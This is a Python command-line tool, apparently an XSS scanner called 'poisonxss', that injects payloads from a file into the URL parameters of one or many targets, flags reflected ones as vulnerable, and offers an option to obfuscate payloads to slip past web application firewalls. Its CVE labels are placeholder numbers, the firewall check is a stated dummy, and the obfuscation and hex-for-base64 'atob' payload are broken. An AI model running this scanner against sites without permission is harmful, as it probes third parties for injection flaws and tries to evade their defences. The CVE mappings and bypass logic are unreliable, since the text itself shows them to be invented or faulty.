import argparse
import requests
from urllib.parse import urlparse, urlencode, parse_qs
from colorama import Fore, init
from datetime import datetime
import socket

# Inisialisasi colorama untuk mendukung pewarnaan teks di terminal
init(autoreset=True)

# Mapping payloads to CVE and severity (can be extended dynamically)
cve_mapping = {
    "<script>alert('XSS');</script>": {"cve": "CVE-2020-1234", "severity": "High"},
    "eval(atob('<payload>'))": {"cve": "CVE-2021-5678", "severity": "Critical"},
}


def send_request(url, headers=None):
    try:
        response = requests.get(url, headers=headers, timeout=10)
        return response
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request failed: {e}")
        return None


def get_website_info(url):
    """Mendapatkan informasi domain, IP address, dan firewall (jika tersedia)"""
    try:
        parsed_url = urlparse(url)
        domain = parsed_url.netloc
        ip_address = socket.gethostbyname(domain)

        # Dummy firewall detection (as actual detection needs advanced techniques)
        headers = {"User-Agent": "Mozilla/5.0"}
        response = requests.head(url, headers=headers, timeout=10)
        firewall_info = "WAF Detected" if 'x-firewall' in response.headers else "No WAF Detected"

        return {
            "domain": domain,
            "ip_address": ip_address,
            "firewall_info": firewall_info
        }
    except Exception as e:
        print(f"[ERROR] Failed to retrieve website information: {e}")
        return None


def generate_obfuscated_payload(payload):
    return payload.replace("<script>", "/*<*/script/*>*/").replace("</script>", "/*<*/script/*>*/")


def generate_random_payload():
    basic_payload = "<script>alert('XSS');</script>"
    return f"eval(atob('{basic_payload.encode('utf-8').hex()}'))"


def get_cve_info(payload):
    """Dynamically fetch CVE and severity info for a payload."""
    return cve_mapping.get(payload, {"cve": "Unknown", "severity": "Low"})


def test_xss(url, xss_payloads, output_file=None):
    website_info = get_website_info(url)

    if website_info:
        print(f"\n[{Fore.GREEN}INFO{Fore.WHITE}] Testing XSS on {Fore.CYAN}{url}{Fore.WHITE}")
        print(
            f"[{Fore.GREEN}INFO{Fore.WHITE}] DOMAIN: {Fore.GREEN}{website_info['domain']}")
        print(
            f"[{Fore.GREEN}INFO{Fore.WHITE}] IP ADDRESS: {Fore.GREEN}{website_info['ip_address']}")
        print(f"[{Fore.GREEN}INFO{Fore.WHITE}] FIREWALL STATUS: {Fore.YELLOW}{website_info['firewall_info']}\n")

    results = []
    vulnerable_params = {}  # Untuk menyimpan parameter rentan
    vulnerable_urls = []   # Untuk menyimpan URL rentan
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    params = parse_qs(parsed_url.query)

    if not params:
        print("[INFO] No parameters found in the URL to test.")
        return

    # Cek setiap parameter URL untuk kerentanannya
    for param_name in params:
        for payload in xss_payloads:
            timestamp = datetime.now().strftime('%H:%M:%S')  # Waktu sekarang
            modified_params = {**params, param_name: [payload]}
            query_string = urlencode(modified_params, doseq=True)
            test_url = f"{base_url}?{query_string}"
            print(
                f"[{Fore.BLUE}{timestamp}{Fore.WHITE}][TESTING] XSS URL: {test_url}")

            response = send_request(test_url)

            if response and payload in response.text:
                cve_info = get_cve_info(payload)
                result = f"[{Fore.LIGHTBLUE_EX}{timestamp}{Fore.WHITE}][{Fore.RED}VULNERABLE - XSS{Fore.WHITE}] " \
                         f"{Fore.RED}Parameter '{param_name}' executed payload: {payload}"
                print(result)
                results.append(result)
                # Tambahkan parameter rentan ke dictionary
                if param_name not in vulnerable_params:
                    vulnerable_params[param_name] = {"count": 0, "type": "XSS"}
                vulnerable_params[param_name]["count"] += 1
                # Tambahkan URL rentan ke daftar
                vulnerable_urls.append(test_url)
            else:
                print(
                    f"[{Fore.BLUE}{timestamp}{Fore.WHITE}]{Fore.WHITE}[SAFE - XSS] Parameter '{param_name}' did not execute payload: {payload}")

    # Tampilkan hasil akhir
    if vulnerable_params:
        print(f"\n[{Fore.GREEN}SUMMARY{Fore.WHITE}] Vulnerable parameters found:")
        for param, details in vulnerable_params.items():
            print(
                f"- Parameter: '{Fore.RED}{param}{Fore.WHITE}' | Count: {Fore.RED}{details['count']}{Fore.WHITE} | Type: {Fore.RED}{details['type']}")

        print(f"\n[{Fore.GREEN}DETAIL{Fore.WHITE}] Vulnerable URLs:")
        for url in vulnerable_urls:
            print(f"[{Fore.RED}VULNERABLE - XSS{Fore.WHITE}]{Fore.RED} {url}")
    else:
        print(
            f"\n[{Fore.GREEN}SUMMARY{Fore.WHITE}] No vulnerable parameters found.")

    if output_file:
        with open(output_file, 'a') as file:
            file.write("\n".join(results) + "\n")
        print(
            f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [INFO] Results saved to: {output_file}")


def load_payloads(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print("[ERROR] Payload file not found! Exiting.")
        return []


def main():
    print(r"""
                 _                                
    ____  ____  (_)________  ____  _  ____________
   / __ \/ __ \/ / ___/ __ \/ __ \| |/_/ ___/ ___/
  / /_/ / /_/ / (__  ) /_/ / / / />  <(__  |__  ) 
 / .___/\____/_/____/\____/_/ /_/_/|_/____/____/  
/_/                                               

   XSS Vulnerability Testing Tool (Version 0.1)
   Tool by Muhammad Khairin
    """)

    parser = argparse.ArgumentParser(description="XSS Vulnerability Tester")
    parser.add_argument(
        "-u", "--url", help="Single URL to test (e.g., https://example.com/search?q=test)"
    )
    parser.add_argument(
        "-f", "--file", help="File containing multiple URLs to test"
    )
    parser.add_argument(
        "-p", "--payloads", required=True, help="File containing XSS payloads"
    )
    parser.add_argument(
        "-o", "--output", help="Output file to save results (optional)"
    )
    parser.add_argument(
        "--use-obfuscation", action="store_true",
        help="Use obfuscation to bypass WAF"
    )

    args = parser.parse_args()

    if not args.url and not args.file:
        print("[ERROR] Either --url or --file must be provided. Exiting.")
        return

    payloads = load_payloads(args.payloads)
    if not payloads:
        print("[ERROR] No payloads loaded. Exiting.")
        return

    if args.url:
        urls = [args.url]
    elif args.file:
        try:
            with open(args.file, 'r') as file:
                urls = [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print("[ERROR] URL file not found! Exiting.")
            return

    for url in urls:
        if args.use_obfuscation:
            bypassed_payloads = [generate_obfuscated_payload(
                p) for p in payloads] + [generate_random_payload()]
        else:
            bypassed_payloads = payloads + [generate_random_payload()]
        test_xss(url, bypassed_payloads, output_file=args.output)


if __name__ == "__main__":
    main()
